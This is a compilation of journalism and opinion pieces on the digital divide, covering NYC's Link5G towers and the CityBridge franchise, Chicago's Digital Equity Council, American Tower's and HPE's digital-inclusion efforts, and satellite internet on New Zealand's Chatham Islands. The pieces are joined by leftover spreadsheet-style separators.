“Link5G will be a badly needed additional option that carriers can leverage,” he continued.

A spokesperson for DoITT, which oversees the Link programs via the franchise agreement, also noted that the new tech would increase the power of existing 5G networks, while the multi-tenant design would reduce the oversaturation of carriers’ small cell sites on the streetscape.

“The wireless carriers were consulted on the Link5G design to accommodate the kind of equipment that is needed now and for years to come,” said the DoITT spokesperson, Stacy Gardener. “These structures allow for the installation of small cells in a denser configuration, requiring fewer installation locations.”

The city is expected to receive 8% of gross revenue up to $200 million, plus an additional 50% on all revenue over $200 million, according to the new deal.

DoITT officials acknowledge that CityBridge previously overestimated how much revenue would be generated through ad sales for LinkNYC kiosks. But representatives of both CityBridge and DoITT declined to provide an estimate of how much revenue would be generated by leasing space to telecom companies in the Link5G towers.

Between 2021 and 2030, the city expects to receive a minimum total of $87.5 million, Gardener said. It includes the $60 million owed and a minimum payment of $750,000 in 2021 and $3 million per year for 2022 through 2030. CityBridge paid $25 million of its debt to the city in June 2021, after the amendment’s approval.

Seeking Equity

Only time will tell if the company’s new business model becomes financially viable, an epic failure like the preceding advertising model or something in between.

One source from a telecom giant said their company doesn’t have confidence in CityBridge’s ability to complete the rollout of Link5G, predicting that the structures will “run into a buzzsaw” when people start to see them crop up in their communities.

“I don’t think they’ll be able to scale it,” said the source, who asked to remain anonymous to speak freely about Link5G and the industry’s ambitions for 5G expansion.

The Link5G installations come as telecom companies like AT&T are ramping up deployment of small cell sites for 5G. A recent blog post by an AT&T executive explained that the company is “pushing the traditional options for how 5G is deployed” as it targets streetlights and other existing infrastructure.

“Keeping pace means continued expansion and enhancement of the network, including more 5G small cell sites in areas where you live, work and play,” the post reads.

The president for AT&T’s North Region echoed that sentiment. “In New York City, a robust 5G network will help fight the digital divide and boost our economy — which is why we are working with City government and beyond to explore every option to roll out more 5G nodes as quickly as possible,” said the president, Patricia Jacobs.

According to Shane Greenstein, an economist and professor at Harvard Business School, and author of How the Internet Became Commercial: Innovation, Privatization, and the Birth of a New Network, the financial incentives for expanding 5G networks are great in an industry that has seen explosive growth over the last decade. Citing U.S. Census data, Greenstein explained that total revenue from wireless data services has increased by roughly $5 billion each year since 2010.

The next generation of wireless connectivity could enable a slew of data-intensive applications and services to be used outside the home, from high-quality video streaming, to mobile, interactive gaming, to quick software updates for autonomous vehicles. However, the ultimate success of 5G will rely as much on developers and users as network expansion itself. “Until you see that app community come forward with imaginative new uses, that’s going to slow the deployment and usage. You’ve got to have the whole ecosystem move forward,” Greenstein said.

To make up for inequitable distribution in the past, CityBridge is required to install 90% of the new poles above 96th Street in Manhattan and in The Bronx, Brooklyn, Queens and Staten Island, per the deal. Among the total of 4,000 structures required to be built, CityBridge is also required to install 739 in 13 so-called “equity” areas.

City officials picked the locations based on their substantial foot traffic, low median incomes and lack of broadband options for local households. The areas include Hunts Point and Longwood in The Bronx; Bushwick, Brownsville and Ocean Hill in Brooklyn; Inwood and Washington Heights in Manhattan; Rockaway, Jamaica and Hollis in Queens; and Port Richmond, St. George and Stapleton in Staten Island.

As the city is prioritizing these areas for the installation of a private company’s money-making machines, other built environment shortcomings — including a lack of tree canopy, excessive illegal trash dumping and limited access to affordable, healthy food options — remain a detriment to the quality of life for local residents there.

Levitan said telecom companies need “suitable underlying power and fiber infrastructure” to support their 5G equipment, and that the equity areas “have typically lagged in such fiber infrastructure.” He declined to share any 5G network maps that may be in CityBridge’s possession and referred THE CITY to telecom companies for more information.

“Link5G will expand fiber to these neighborhoods as well as provide additional locations to place 5G radio equipment,” Levitan said.

Gardener noted that the structures will provide the familiar menu of LinkNYC amenities, such as free Wi-Fi, USB ports and calling capabilities. “Bringing all of these services to previously underserved areas was a top consideration,” she said.

A spokesperson for CityBridge didn’t say where Link5G installations will begin first. One pole, in Long Island City, is already up for testing, THE CITY reported in March.

‘An Even Bigger, Uglier Solution’

Their height would make for highly visible pieces of street furniture.

Manhattan neighborhood preservation groups Landmark West! and Save Chelsea have already spoken out against what they view as an eyesore.

Sean Khorsandi, executive director of Landmarks West! and a professor of design and architecture at the New York Institute of Technology, said CityBridge shouldn’t be rewarded for failing to distribute kiosks to low-income neighborhoods on its first try.

But that’s exactly the message the city is signaling, he added: “‘Because you did such a poor job of it, you get this prize of an even bigger, uglier solution that now does something else.’ So, these were never meant to be 5G transponders.”

Up close the new Link5G, descendent of the failed LinkNYC, is bigger, uglier, and even dumber looking than I expected. Some shoddy worksmanship, too. The little tablet looks kinda cute, though, in the belly of this beast.

Nevertheless, investors are betting on CityBridge’s new model.

ZenFi Networks, a digital infrastructure company based in the tri-state-area, is investing $200 million in CityBridge. The company will be the primary builder of Link5G, laying the fiber network infrastructure, according to DoITT. This network will extend into many parts of the city that currently lack fiber, potentially opening up high-speed broadband access to homes and businesses in underserved neighborhoods.

ZenFi is no stranger to CityBridge. The company built the infrastructural framework for the LinkNYC program, its CEO, Ray LaChance, told Telecom Ramblings in 2017.

Walter Cannon, vice president for business development at ZenFi, cautioned that the rollout of Link5G isn’t the be-all-end-all solution to tech accessibility issues. “It’s like peeling the onion back, and this is just one of the layers on the outside,” he said.

Cannon pointed to a partnership between CityBridge and Silicon Harlem, a digital equity organization in Upper Manhattan, on the creation of a “gigabit center.” Located at West 148th Street and Frederick Douglass Boulevard, the recently opened center offers community members a place where they can use computers and access the internet.

A 2015 amendment to CityBridge’s original agreement required the company to establish a center in each of the five boroughs. A center for each of the other boroughs — The Bronx, Brooklyn, Queens and Staten Island — has yet to be established. A spokesperson for CityBridge declined to provide a status update on their development.

Still, LinkNYC skeptics say the program isn’t doing much overall to solve equity issues.

Shannon Mattern, a professor of anthropology at The New School who’s long studied libraries and media infrastructure, said that libraries have been more effective than LinkNYC at addressing digital inequity. She said libraries provide “the hardware, the software, that connectivity free of charge to anybody who wants to come in their doors or sit on the stoop outside for the Wi-Fi that leaks outside the building.”

The city’s three library systems make 8,500 computer workstations available to the public and offer free Wi-Fi at every branch. Since 2015, they have also lent Wi-Fi hotspots to patrons.

Germaine Halegoua, a digital media scholar based at the University of Michigan, noted that bridging the digital divide will depend on more than just improvements to wireless technology. Despite 5G’s robust connection speeds, Halegoua explained, “If you don’t have a computer and you’re a cellphone-only user, and you’re trying to fill out a job application, or download your homework, it’s not going to help with the fact that you don’t have a device to do that. It’s not going to help with digital literacy.”

‘Reinvent the Payphone’

Controversy hasn’t always surrounded CityBridge.

In late 2012, the Bloomberg administration announced a competition to “reinvent” the public payphone as the city’s franchise agreement with Titan — a private advertising firm with a monopoly on the city’s aging payphone network — was dwindling. Titan remained profitable through ad sales and contributed millions to the city’s coffers in the early 2000s, even as payphones suddenly became relics of a bygone era.

“The goal of Reinvent Payphones is to foster innovative, data and design-driven ideas that will help modernize payphone infrastructure across the five boroughs and optimize use of public space once the City’s current payphone contracts expire in 2014,” noted a press release on Dec. 4, 2012, when more than 11,000 payphones stood citywide.

Applications poured in for the competition, mostly from professional designers and architects, said Aaron Shapiro, an assistant professor of technology studies at the University of North Carolina at Chapel Hill, who detailed the contest in his book, “Design, Control, Predict: Logistical Governance in the Smart City.”

The competition dragged on, outlasting Mike Bloomberg’s final term in office. His successor, Bill de Blasio, inherited it when he was elected mayor in 2014.

Under the de Blasio administration, the competition got a rebranding to match the new mayor’s campaign promises around reducing economic inequality, Shapiro said. The infrastructure project transformed into a vehicle to bridge the digital divide.

DoITT changed request for proposals to say that any franchisee intending to sell ads would be required to provide Wi-Fi and USB outlets free of charge, he said.

Out of this contest emerged a winner, with a design of nearly 10-foot-tall kiosks with LED advertising displays. The original CityBridge consortium consisted of Control Group and Titan, along with Qualcomm, Comark, Transit Wireless and Antenna Design.

Within months, however, this mix of startups and established New York players would pique the interest of a Silicon Valley giant — Google. In 2015, Google (now called Alphabet), acquired Titan and Control Group through its newly formed subsidiary Sidewalk Labs, merging the two companies to form Intersection. At the time, this new venture was branded as a civic tech enterprise; currently, Intersection markets itself primarily as an out-of-home advertising company. (Intersection shares its Hudson Yards offices with Sidewalk Labs, well-known for its unsuccessful “smart city” ambitions along Toronto’s waterfront.)

Early enthusiasm for Link’s seemingly locally grown efforts to bridge the digital divide was quickly dampened by the sudden influence of Google, said Greta Byrum, an advocate who has worked on digital justice issues for more than a decade, and a former co-director, with Wiley, of The New School’s Digital Equity Lab.

“Many of us in the public interest community,” Byrum recalled, “came out in favor of something that was going to be about New York companies doing something for New York. And then all of a sudden Google was at the table. A lot of us already had concerns about Google’s monopoly power and its unaccountable data collection and extraction practices.”

Levitan said the company only collects emails from people who use the free Wi-Fi, but “LinkNYC does not track or log Wi-Fi user’s activities on the internet.” Its privacy policy acknowledges that the company doesn’t track a user’s precise location, but it knows where it provides Wi-Fi, so if you use it, “we can determine your general location.”

Such data collection concerns persisted in the years to follow, as the installation of security cameras within each kiosk, coupled with a pattern of cooperation with the NYPD, stoked the alarm of surveillance activists. More salient, however, was the program’s cascading failures of its animating mission. After reports of people using one of LinkNYC’s original functionalities, web browsing, to view internet pornography, CityBridge disabled the feature.

Yet by early 2019, construction of new kiosks had ceased altogether due to lack of advertising revenue. In February of the following year, THE CITY reported that dozens of kiosks had been installed but not activated — a visible sign of the program’s decline.

Patchwork Landscape

In early 2020, the Mayor’s Office of the Chief Technology Officer released the New York City Internet Master Plan, which included ambitious digital equity goals.

Mentioning the Link program only in passing, the plan instead emphasized “open access fiber optic infrastructure” and next-generation wireless technologies such as 5G as the key to giving New Yorkers access to affordable, high-speed internet. Published just weeks before the city’s first lockdown, the plan presciently anticipated the spotlight on digital equity issues during the pandemic, as so many critical activities — particularly education — migrated online.

The plan’s initial phase aimed to leverage city assets to bring service to low-income and under-connected households and businesses. By the fall of 2021, the city had already partnered with community-based internet providers to bring high-speed broadband to 18 NYCHA complexes and announced $157 million would be allocated to building out its open-access broadband infrastructure over the next 36 months.

NYC Mesh, one of the vendors providing service for public housing residents, operates its own low-cost fixed wireless network that has penetrated into neighborhoods with fewer choices in service providers, particularly in central Brooklyn. Last year, the nonprofit, volunteer-run group applied to establish dozens of additional hubs on the city’s public buildings, a potentially significant step toward grassroots, universal Wi-Fi access in the city.

Meanwhile, prior to the resuscitation of the LinkNYC program, the Public Design Commission — first in 2020, and again in 2021 — had already approved DoITT’s separate, single-tenant and multi-tenant designs for installing 5G infrastructure atop the city’s existing stock of street lamps and traffic lights. Working in conjunction with the Department of Transportation, DoITT’s “pole-top reservation plan” resembles the basic concept of Link5G, with a special encasement affixing mobile telecommunications equipment to a tall structure.

One source with inside knowledge of the Public Design Commission’s review process described the Link5G structures as “supplemental” to the city’s original 5G plans. The source indicated the commission would be determining whether or not Link5G would be necessary in areas where there may be an opportunity for the pole-top plan to be carried out. An industry source also spoke to the strong preference on part of telecom companies for using street poles. “These are ideal for 5G deployments, particularly at intersections where we can see up and down the avenues and across the cross streets.”

However, by March 2022, just one pole has been installed with a 5G “node.” The industry source noted that a federal lawsuit against the city over a lack of accessible pedestrian signals for visually impaired people had stalled the further installation of 5G equipment.

Within this patchwork landscape of public and private infrastructures and cellular network providers, the Link program’s complex funding mechanisms may invite questions about what the true cost of digital equity really is in New York City, and why a public good such as universal broadband must be hitched to private profits in the first place, whether in the form of advertising revenue or high-speed wireless service.

Beyond 7G

As the tech summit came to a close, Colvin’s panel fielded questions from the crowd. One audience member asked what the future holds for the LinkNYC program.

The hope, Colvin explained, is that the new network of structures can live beyond 7G.

“It’s definitely designed to last at least 10 to 15 years,” he said.

Looking ahead, some people invested in digital equity issues do see some potential for Link5G to level the playing field between big telecom corporations and community-based service providers, especially when it comes to the new fiber infrastructure that the towers will bring.

For Greta Byrum, the towers’ 5G services are actually a secondary benefit to ZenFi’s fiber network build-out.

“Whatever is sticking out of the ground, in terms of street furniture, is less important than what the franchise is able to achieve as far as bringing fiber to the outer boroughs,” she said. “Laying the fiber is the important thing, because that means that there can be more options on the market.”

“We need more diversification in the broadband market if we’re ever going to move beyond price fixing and digital redlining.” Byrum noted that, in the absence of smaller, locally-based providers, the dominance of large telecom companies operating at scale in New York City may stifle the kind of competition that can lead to more affordable rates.

According to the city’s Internet Master Plan, high-speed broadband subscriptions can range from $50 to more than $125 per month, depending on the provider — and the number of options available to customers can vary widely depending on location.

Byrum further explained how ZenFi’s local roots and regional focus, for instance, may signal a more genuinely public turn for the Link program: “If we are going to rethink what internet provision looks like, and we’re saying that local groups should be providing net-neutral, eco-friendly service in their neighborhoods that protects people from exploitation, a company like ZenFi is much more likely to partner with groups like that.”

To whatever degree Link5G will help to bridge the digital divide, New Yorkers in need may play an important role in helping build that bridge themselves.

""I'm excited to join Mayor Lightfoot as she announces the Digital Equity Council, a community-driven effort to address the barriers to digital equity citywide,"" said Alderman Michael Scott Jr., Chairman of the Committee on Education and Child Development.","Today, Mayor Lori E. Lightfoot announced the launch of the Chicago Digital Equity Council, a cross-sector, community-driven effort to understand and tackle the nuanced barriers to digital equity and close Chicago’s digital divide once and for all.

Chicago’s digital divide is a racial equity issue. As many as 20% of Chicago households are without internet, and over 12% don’t have computers. Communities with the lowest connectivity rates are over 90% Black on average, with median household incomes averaging less than $27,000. Through a comprehensive community engagement strategy, the Digital Equity Council will make recommendations to close this gap, reaching a state of digital equity where all Chicagoans have the digital skills, tools, and resources they need to fully participate in society, democracy, and the economy.

""Since the beginning of my administration, one of my highest priorities has been to give residents the tools they need to achieve their full potential,” said Mayor Lightfoot. “That’s why we have mobilized City funding to close the digital divide and improve internet access in our most vulnerable communities. Closing gaps in access to technology and learning tools will have a positive impact across our entire city and will support the next generation of digitally empowered Chicagoans.”

The Digital Equity Council was born out of Chicago Connected, a first-of-its-kind broadband program that has connected over 64,000 Chicago Public Schools (CPS) students to at-home high-speed internet and made free digital learning resources available to families. The Digital Equity Council will build upon Chicago Connected’s historic progress in the K-12 space to pinpoint and tackle the barriers to digital equity Chicago residents face citywide.

Mobilizing the Mayor’s Chicago Recovery Plan and utilizing historic investment in broadband in President Biden’s Bipartisan Infrastructure Law, the City of Chicago is dedicating unprecedented resources to closing the digital divide and addressing the lasting repercussions the COVID-19 pandemic has had on Chicago’s most vulnerable communities.

""Equity is both an outcome and a process that results in fair and just access to opportunity and resources that provide everyone with the ability to thrive,” said Candace Moore, City of Chicago’s Chief Equity Officer. “In order to solve a systemic issue like access to affordable internet, it is essential to partner with community members who are most impacted. I'm excited by the diverse expertise on the Digital Equity Council and am confident they will help lead our city to a more equitable future.""

“Far too many Americans, especially Black Americans, remain on the wrong side of the digital divide. From the West Side to the South Side, and all-around Chicago, this leaves them unable to fully participate in our modern society, including the many professional, educational, health, and social opportunities that the Internet offers,” said Federal Communications Commission (FCC) Commissioner Geoffrey Starks. “I firmly support Mayor Lightfoot’s efforts to create a community-driven effort to eradicate this challenge. We know that community is one of the strongest sources of trusted information about the many programs currently available to help drive digital equity, including the Federal Communications Commission’s Affordable Connectivity Program.”

The Digital Equity Council is led by a group of community leaders, community-based organizations (CBOs), government entities, and digital equity subject matter experts. Known as the Guiding Team, this cross-sector leadership group is working to reimagine the relationships among people, programs, and organizations to achieve systemic change. With representation from communities across the City, this team ensures that Chicagoans most burdened by the digital divide are at the table and centered in decision-making.

""The gap in digital resources, such as quality Internet, computers, and learning tools, creates growing disadvantages for families who are low-income and experience language barriers in my community,” said Karina Aguilar, a community leader on the Digital Equity Council Guiding Team. “As a Spanish-speaking immigrant, I had to teach myself how to navigate technology to support my five CPS students, especially my special needs son who requires a device to communicate throughout the day. Now, I work to support Spanish-speaking parents who are learning how to use email, create a resume on Microsoft Word, or use social media to communicate with loved ones.”

Over the next six months, the Digital Equity Council will be facilitating a series of Community Conversations. Conversations will focus on 1) Barriers to Digital Equity, 2) Community Assets and Digital Equity Resources, and 3) Co-creating Solutions to Achieve Digital Equity.

""Reliable internet service is essential for many aspects of engaging in today’s world, including accessing educational resources, searching for jobs, and accessing critical online services such as telehealth. Yet many of our low and moderate income clients lack quality internet service,"" said Karen Freeman-Wilson, President and CEO of the Chicago Urban League. ""That's why we are excited about the City's commitment to addressing the digital divide with the launch of the Digital Equity Council.”

The work of the Digital Equity Council will be focused in areas of the City with the lowest rates of at-home internet connectivity, but there will be opportunities to share experiences, perspectives and ideas citywide through both digital and in-person / paper-based channels to ensure participation is accessible for all. Events will be offered in English and Spanish.

“Equity, inclusion, and lifelong learning opportunities are at the heart of Chicago Public Library's mission,” said Chicago Public Library Commissioner Chris Brown. “As the City's largest provider of free broadband, we extend digital access to every age group in every neighborhood in Chicago. That's why CPL is proud to be part of the City's Digital Equity Council, and our collective effort to mobilize resources towards bridging the digital divide.”

The City recognizes the importance of collaborating across sectors to ensure investments, programs, and policy are coordinated and build upon the community work already in motion. As such, the work of the Digital Equity Council will culminate in a digital equity roadmap, advising efforts across the digital equity ecosystem. The DEC will also advise on how to institutionalize an ongoing digital equity coalition to ensure closing the digital divide remains a top priority for government, the private sector, and direct service providers alike.

""I'm excited to join Mayor Lightfoot as she announces the Digital Equity Council, a community-driven effort to address the barriers to digital equity citywide,"" said Alderman Michael Scott Jr., Chairman of the Committee on Education and Child Development. ""My top priority as Alderman is to make sure my residents have access to every tool they need to grow and thrive.""

“Digital inclusion coalitions across the country have responded to the triple challenges of the COVID-19 pandemic, growing economic inequality, and racial injustice facing poor communities and communities of color without access to broadband internet at home,” said Adrianne B. Furniss, executive director of the Illinois-based Benton Institute for Broadband & Society. “We are thrilled that the City of Chicago is building on its impactful efforts to date and continuing to prioritize equitable access to affordable broadband with an emphasis on low-income, unserved, and underserved populations. Combining access, affordability, and digital skills training will empower users to make the most of their broadband connections and help ensure that individuals and communities in the city of Chicago will have the tools they need for full participation in our society, democracy, and economy.”

COVID-19 has exposed digital inequities globally and exacerbated the digital divide.","The COVID-19 pandemic has shown the importance of digital connectivity for everything from work-from-home to education and telemedicine.

It also illustrated the global digital divide: 2.9 billion people worldwide do not use the internet.

Organizations must find new ways to collaborate and partner to develop affordable and accessible digital solutions for health, finance and education, and to close this gap.

Today’s global challenges require us to think big and bring maximum ambition to the table. The challenge of achieving universal digital inclusion is no exception. We need to mobilize the best ideas, resources and know-how, and hold ourselves accountable to specific commitments. This is what the World Economic Forum’s EDISON Alliance’s 1 Billion Lives Challenge sets out to do by developing affordable and accessible digital solutions across health, finance and education by 2025.

Enabling connectivity

The COVID-19 pandemic has powerfully demonstrated the importance of connectivity for everything from work-from-home to education and telemedicine – and the urgency of addressing the global digital divide. However, owing to cost, scalability, power outages and educational barriers, the reach of the internet in many developing countries remains limited and 2.9 billion people worldwide don't use the internet.

We must come together to expedite the delivery of solutions. Everyone in a position to help close this digital divide must do so without delay, drawing on their strengths. American Tower is using its communications infrastructure in an innovative way by building digital communities at or near tower sites to provide education and other services to people in remote and rural areas.

Billions of people worldwide have no access to the internet Image: ITU/Statista

In many developing countries, a communications tower is not only the first broadband connection for a community but also the first connection to electricity. In several of our digital communities, we have built computer-equipped kiosks that use the power supply and broadband connection from our nearby tower sites. In other cases, we have built classrooms at the base of our towers staffed by non-profit partners.

We now have close to 300 digital communities, located in Africa, Asia, North America and South America. Since the inception of our programme, more than 128,000 students have enrolled in our learning centres and more than 116,000 have received digital skills certifications. The latter enhances employability and entrepreneurship opportunities and better positions individuals to access information, e-government services and other online resources.

Stepping up to do more

We must grow these efforts in a significant way and, through the 1 Billion Lives Challenge, we have pledged to do just that. In September, American Tower committed to building 2,000 digital communities over the next five years to improve the quality of life in underserved populations. This work will support connectivity worldwide through community education, healthcare access, financial inclusion and career development.

The impact of an American Tower digital community Image: American Tower

Crucial to American Tower’s success in meeting this commitment will be the power of partnership. In a fruitful collaboration, each player brings unique advantages, resources, relationships and know-how to address unmet needs. Building digital systems involves partnerships with wireless carriers, technology organizations, non-profits and others to bring transformational connectivity opportunities, like education and healthcare, to communities in need. In Nigeria, for example, 64 digital communities across 25 states deliver digital training and education with partners including IBM, the Lagos State Employment Trust Fund and Ondo State Ministry of Science and Technology.

Increasingly, public-private partnerships are complemented by private-private partnerships. Companies from different sectors collaborate at the project level in a particular country or region, supporting both business and social goals, and enhancing the well-being of the communities where we operate. For example, we are collaborating with Hewlett Packard Enterprise (HPE) in India, with American Tower providing education using its telecommunications infrastructure and HPE facilitating healthcare access to jointly enable the provision of services to communities in need.

digital, COVID-19, EDISON Alliance EDISON Alliance: What is the Forum doing to close the digital gap? COVID-19 has exposed digital inequities globally and exacerbated the digital divide. Most of the world lives in areas covered by a mobile broadband network, yet more than one-third (2.9 billion people) are still offline. Cost, not coverage, is the barrier to connectivity. At The Davos Agenda 2021, the World Economic Forum launched the EDISON Alliance, the first cross-sector alliance to accelerate digital inclusion and connect critical sectors of the economy. Through the 1 Billion Lives Challenge, the EDISON Alliance aims to improve 1 billion lives globally through affordable and accessible digital solutions across healthcare, financial services and education by 2025. Read more about the EDISON Alliance’s work in our Impact Story.



Another such model might be a private company and a private academic institution. In a planned pilot project with Tecnológico de Monterrey, for example, we aim to define and implement digital communities in various rural and urban sectors of high vulnerability in Mexico. Our partner’s knowledge of the Mexican market will be of great value as we measure pilot outcomes and consider opportunities to scale in other parts of Mexico.

By fostering the adoption of a wide array of internet-enabled services, these partnerships can generate positive social and economic outcomes that will hasten the attainment of the Sustainable Development Goals, including access to quality education, reduction of poverty, reduction in economic inequality and achieving gender equality.

A digital economy works when everyone has the opportunity to participate.
Inclusive growth requires us to put the digital economy to work for everyone.","It has been more than a year since COVID-19 landed on our shores, and the economic fallout continues to unfold in unpredictable ways.

But one thing is indisputable: forced apart by lockdowns and physical distancing, the world devised ways to collaborate and innovate like never before, thanks largely to an accelerated adoption of digital technologies. Indeed, the growth of world’s digital economy has surged in response to this global crisis, and it has brought with it new economic opportunities and scientific breakthroughs. The big questions is – how do we use this momentum to create equitable opportunities for everyone in the future digital economy?

In Singapore, the government managed to respond swiftly and effectively to the pandemic using technology: activating telemedicine, implementing remote working and smoothly rolling out vaccinations. Thanks to the state’s digital maturity, Singapore was able to effectively pivot to virtual meetings, distance learning, and online transactions, while also contributing meaningfully to the international COVID-19 research effort. Yet, other nations in the region have not fared as well. The reality has uncomfortably exposed existing fractures of the widening digital divide and reminded us that those without access to technology will be left behind. Digitalisation and connectivity can fuel the next lap of global economic growth, but to fully realise the potential of a global digital economy and collectively emerge stronger, it is crucial to support digital inclusion for all.

The COVID-19 crisis gives us new impetus to alleviate the inequalities of the worsening digital divide and provide everyone quality access to technology. With public and private sectors currently investing heavily in digital transformation, global governments and technology giants now have an opportunity to intentionally shape what the future digital economy will look like. In a ‘digital first’ world, the digitally illiterate will be excluded from economic advancements. So, it comes as no surprise that the World Economic Forum ranks ‘digital inequality’ among its top five most concerning short-term global threats.1 To build a digitally inclusive playing field that bridges the digital divide we must focus on these areas: connectivity, digital literacy, and access to insights.

Ubiquitous and equitable connectivity

When schools closed and pivoted into online learning in full swing, fault lines emerged in the harsh light of the pandemic. We’ve read news of volunteers rushing to deliver laptops and internet-enabling devices to families in need. Companies—including Hewlett Packard Enterprise (HPE)—responded by offering Wi-Fi hotspots in buses, stadium parking lots, and even a passenger ferry.

These are stop gap measures. Looking forward, we must aim towards the provision of seamless, ubiquitous, affordable and secure connectivity. Beyond helping students with schoolwork, internet access is paramount in enabling unfettered participation in the digital economy.

Digital literacy – a lifelong learning tool

Channelling the power of technology and good quality education are proven ingredients for advances in social and economic development. In this area, Singapore has steadily topped the charts for digital inclusiveness, according to Roland Berger’s Digital Inclusion Index 2020. But a third of the Southeast Asia population remains excluded from digital technologies, casting a stark contrast on the region’s digital divide.2

COVID-19 has underlined the connectivity chasm, and there is an urgency to alleviate the existing entrenchment of both social and economic inequality. Governments have taken the lead in formulating policies, but more can be done. Technology companies especially, are at the forefront of spearheading

digital innovation and have a front row seat in rolling out initiatives such as upskilling training and STEM programmes to directly impact individuals’ digital literacy. Many countries have already partnered with technology providers—including HPE - to develop innovative STEM programmes such as Cyber Squad games, which help youths learn computer science in an engaging way and build necessary ‘digital muscles’ to brave this new world.

Going beyond data-driven

We are entering the Age of Insight, a new era where value is created from discoveries gleaned from rapid analysis of large amounts of data.

Be it healthcare, climate change, computing, or food security, these industries would require both access and skills to work with frontier technologies such as artificial intelligence, IoT and machine learning. These advancements also need to be made available to organizations that lack the necessary resources to access them. A digital economy works when everyone has the opportunity to participate. Imagine the discoveries we might miss in areas like precision medicine, population health and severe weather events when entire populations lack the insights required to innovate.

We have the technology to advance a more digitally inclusive world today. Inclusive growth requires us to put the digital economy to work for everyone. This takes a proactive, combined effort from governments and companies like HPE. Technology must be a force for good where it can benefit everyone, everywhere, and it’s time that we make it a reality.",Digital Inequality,2021-10-22 08:05:41

In these mundane – albeit convenient – interactions with the internet, the islands are catching up to much of the rest of the world, where constant digital connection has become the norm over the last decade. But beyond the impressive technical feat of getting internet infrastructure to the Chathams, both the awkwardness and utility of connection here is a reminder of how the digital world has reshaped the real one – and the implications that has for the billions who remain unconnected.

F or many people in New Zealand, the Chatham Islands are just the end of the weather forecast, a vague dot somewhere in the Pacific Ocean. Eight hundred kilometres east of Christchurch, the Chathams have a long history; they are known as Rēkohu to the indigenous Moriori people, the only inhabitants of the islands for hundreds of years. Europeans arrived in the late 18th century, and the islands became part of New Zealand in 1841. Often misty, the waters busy with crayfish and glossy blue cod, the Chathams are home to several species of endangered birds, many 4WDs, and 663 people at the 2018 census. As easy as it is to idealise the Chathams as remote and untroubled, for the people who live there, this is just home: far away from any other landmass, but ordinary in the rhythms of seasons and tourists and school years.

According to Kerry Rodgers, suddenly ubiquitous connection on the islands isn’t a good thing. “We’ve lost our community,” he says, looking weary in olive green fleece as he sips his tea. “It started with TV, videos – people stopped visiting each other. Now they sit at the coffee table and text.” Rodgers, a farmer in his seventies, moved to the island years ago, because he liked the isolation. In that isolation, close community can be forged, which Rodgers sees as distinguishing the Chathams from New Zealand. “If you want the islands to be like New Zealand with this fancy computer crap, then you should pack your fucking bags and leave,” he says. Rodger’s concern is that enthusiastic adoption of the internet by most has left some islanders behind.

That community news is now found on a Facebook page and not a printed newsletter, for instance, makes accessing social life on the island much harder for people like him who are uncomfortable with the platform. Banking, too, is difficult: the lone bank on the island is open only on Tuesdays. Rodgers hates having to rely on other people’s honesty as they help him pay bills online.

To others, though, the islands retain a close-knit community, and the internet is merely a useful tool, not a societal disruptor. Gail Amaru is intimately connected to the two thirds of the island who identify as Māori as the “chief tea towel holder” – better known as CEO – of Ngāti Mutunga o Wharekauri, the Māori iwi who claimed mana whenua over the islands they call Wharekauri in 1835. In her small office in the tiny town of Te One, Amaru shows me how her internet speed has increased nearly tenfold; she can run Zoom calls for far-flung iwi members with barely a hitch. Yes, she says, the internet is vital for her work, but when it comes to communicating “the more favoured approach is still a cuppa around the kitchen table”.

Connection is transformative, however, when it comes to communicating with people off the island, connecting the dots with the rest of the world. Hannah Noble, who moved to the islands two and a half years ago, didn’t realise what internet connection in the Chathams would be like. She’d promised her mainland-based mother, who has a cochlear implant and relies on lipreading, that it would still be possible to video call the grandkids after they moved to the islands. Instead, they endured months of clumsy, frustrating landline calls – until the internet upgrade last year. “It’s been so life changing,” she says.

That communication off-island is particularly vital for parents, given that all high school-age kids have to go to boarding schools off-island. “Anything that makes it easier to communicate is great, being able to call [my kids] and just catch up is huge,” says Katrina Graydon, whose five older children live on the mainland. Even grouchy Rodgers says he appreciates video calls with his children living in Australia and the UK. When you live on the Chathams, and people you love don’t, the distance between the islands and everywhere else is omnipresent, but fast internet can ease the separation.

J ust how far away are the Chatham Islands? Start by picturing the ocean. Picture the drive between Auckland and Wellington except it all is ocean. Picture Tirau, submerged, picture Palmerston North salty, picture Fielding among the tide. More ocean than that. Ocean from Invercargill to Picton. Ocean from Cape Reinga to New Plymouth.

How do you bridge this distance? Eight hundred kilometres of ocean takes days to cross on a boat burdened by groceries, timber, and new trucks. Eight hundred kilometres of ocean takes two hours to cross in the humming body of a small plane, propellers whirring above acres of cloud. Eight hundred kilometres of ocean takes seconds to cross on a cell phone, even circuitously. To make a call, your voice becomes a radio signal travelling up to a satellite, back down to land, connecting to the exchange in Wellington. To hear a reply from the other side of the ocean, someone else’s voice goes back up again to the satellite and down to the island, like a small cursor nestled at the end of the long drenched finger of the Chatham Rise. Press the cellphone against your cheek, the glass greasy, and your loved one’s distant words rest against you like ruffled black swans rest against the dark water of Te Whanga Lagoon.

But this immediacy comes at a cost.

Caitlin Metz, head of communications at the Rural Connectivity Group, has spent a lot of time negotiating the distance to the Chathams. To install the satellite system that enables connection on the islands, she and her team have travelled back and forth repeatedly, building relationships with the people who live on the islands. The $11.5 million that it’s cost to set up what islanders call “the new internet” has been carefully budgeted for, part of a grant from Crown Infrastructure Partners – in collaboration with Spark, 2 Degrees, and Vodafone – to install phase two of the Rural Broadband Initiative.

To Metz, getting internet to the Chathams, an effort of which she is enormously proud, is part of a bigger picture about why the internet matters to rural areas, where the RCG has installed 3G and 4G everywhere from Puketapu to Milford Sound. “Rural New Zealanders have welcomed us with open arms because they know better than anyone else how difficult it is to live without connectivity. In this day and age where everything is being pushed more and more online, they feel really vulnerable,” she says.

“It’s a big divide if you’re not part of [the internet],” the organisation’s CEO, John Proctor, agrees. After working in the Cook Islands, he feels sharply aware of how much isolated communities are shaped by their access to the rest of the world. “I love what we do, because we’re giving people a choice about how they connect,” he says.

But even with millions of dollars of public and private funding, making the internet available to people in remote areas is a technical feat. The RCG develops a custom solution for each location where they install connections. On the Chathams, five steel cell towers, as well as satellite dishes, had to be carried across the ocean and set up around the island. The structures look a little absurd, massive smooth discs perched above paddocks piled with craypots and dark, shallow lakes caked by tussocks.

But the important thing is that this infrastructure works. It’s all wireless: if you’re making a video call from the Chathams to mainland New Zealand for instance, your phone connects to the nearest cellphone tower, where the linked satellite dish sends the signal 36,000 kilometres into space, connecting with the EUTELSAT 172B satellite, which sends the signal to the exchange in Wellington, where the signal is then transmitted through the internet service provider, relayed through wires and cables until it connects to the other person’s phone.

